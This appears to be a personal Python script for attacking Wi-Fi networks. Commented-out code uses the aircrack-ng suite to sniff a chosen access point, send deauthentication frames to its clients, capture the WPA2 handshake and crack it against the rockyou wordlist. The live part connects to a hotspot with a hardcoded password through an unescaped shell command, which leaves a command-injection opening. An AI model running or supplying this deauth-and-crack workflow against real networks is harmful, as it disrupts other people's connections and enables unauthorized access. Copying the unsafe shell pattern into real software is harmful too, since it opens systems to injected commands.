import os
import subprocess
from mac_vendor_lookup import MacLookup

#
# os.system("airmon-ng check kill")
# os.system("airmon-ng start wlan0")
# os.system("airodump-ng --band abg wlan0mon")
#
# BSSID = input("Enter the BSSID of any network to be sniffed: ")
# channel = input("Enter the channel this network is working on: ")
# packageName = input("Name of directory to save the package: ")
# os.system("mkdir DataGenerated/" + packageName)
#

############################################# Detect the Mac Vendor ##########################################
# #list the connected devices to the network to detect the mac vendor using the mac address
# os.system("airodump-ng wlan0mon -c " + channel + " --bssid " + BSSID)
#
# # "98:AF:65:B9:F3:E3" is intel
# macAddr = input("Enter the mac address for the vendor lookup: ")
# try:
#   print("\nMacAddress: " + macAddr + "\nVendor: " + MacLookup().lookup(macAddr))
# except:
#   print("Mac vendor not registered")
#################################################################################################################

#
# ############################################# WPA2 handshake #############################################
# capFile_name = input("Enter the name to be assigned to the wireshark capture file: ")
#
# # Define your commands
# command1 = ["airodump-ng", "-c", channel, "--bssid", BSSID, "-w", "DataGenerated/" + packageName + "/" + capFile_name, "wlan0mon"]
# command2 = ["aireplay-ng", "-0", "10", "-a", BSSID, "wlan0mon"]
#
# # Run both commands simultaneously in the background
# subprocess.Popen(command1)
# subprocess.Popen(command2, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
#
# print("Paste the path for generated capture file ")
# capFile_path = input()
#
# os.system("wireshark " + capFile_path)
# os.system("aircrack-ng -a2 -b" + BSSID + "-w rockyou.txt " + capFile_path)

##################################################################################################################
# Restart NetworkManager
os.system("sudo systemctl restart NetworkManager.service")


def connect_to_hotspot(ssid, password):
    # Construct the nmcli command to connect to the hotspot
    nmcli_command = f"nmcli device wifi connect '{ssid}' password '{password}'"
    try:
        # Execute the nmcli command to connect to the hotspot
        subprocess.run(nmcli_command, shell=True, check=True)
        print("Connected to hotspot successfully!")
    except subprocess.CalledProcessError as e:
        print(f"Error connecting to hotspot: {e}")


# Example usage
hotspot_ssid = "OnePlus"
hotspot_password = "123456789"
connect_to_hotspot(hotspot_ssid, hotspot_password)
